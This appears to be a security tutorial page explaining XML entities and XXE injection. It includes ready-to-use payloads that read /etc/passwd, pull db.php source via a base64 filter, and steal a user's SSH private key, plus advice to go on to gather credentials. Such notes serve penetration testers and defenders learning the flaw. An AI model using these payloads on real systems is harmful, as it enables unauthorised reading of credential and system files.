# XML External Entity (XXE Injection)

## XML Information

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Similar to HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). The format used in modern days is JSON instead.

### XML Entities <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

### Document Type Definition <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

### XML Custom Entities <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML allows custom entities to be defined within the DTD. For example:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

### XML External Entities <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

## XXE Information

XML external entity injection (also known as XXE) is a vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

### XXE

Some applications use the XML format to transmit data between the browser and the server. To process the XML data on the server, applications almost generally employ a common library or platform API. Because the XML specification provides a number of potentially harmful features, and standard parsers support these features even if they aren't used by the application, XXE vulnerabilities may exist.

External XML entities are a form of custom XML entity whose defined values are loaded from somewhere other than the DTD in which they are declared. External entities are intriguing from a security standpoint because they allow an entity to be defined depending on the contents of a file path or URL.

### XXE Types

* Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
* Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
* Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
* Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

## XXE Enumeration

Manually testing for XXE vulnerabilities generally involves:

* Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
* Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system.
* Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.

### XXE Example

If the web reports the content of an XML field, the attackers may be able to use an ENTITY to replace the reported field with the content of an internal file of the machine.

First, we must consider if we can upload files to the remote server, if yes. Then we may continue with a payload like the following:

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>AnySubject</Subject>
    <Content>AnyContent</Content>
</elements>
```

After writing a similar code, we should upload this file to the remote server and execute it. If successful, you may try to further enumerate the target system and gather credentials or SSH keys.

Another good example is the following:

```markup
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
            <maintitle>
                <title>&xxe;</title>
                <cwe>no</cwe>
                <cvss>no</cvss>
                <reward>no</reward>
            </maintitle>
```

### XXE Example 2

The line '`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`' defines the file to read and binds it to the variable 'xxe'.

Then back at the XML shown below we are going to print the contents of the file defined in the 'xxe' variable into the comment field so it is viewable.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

#### Extra Steps

If we know that a valid username has a SSH key we can attempt to read it from the common SSH location.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

## References

{% embed url="https://portswigger.net/web-security/xxe" %}

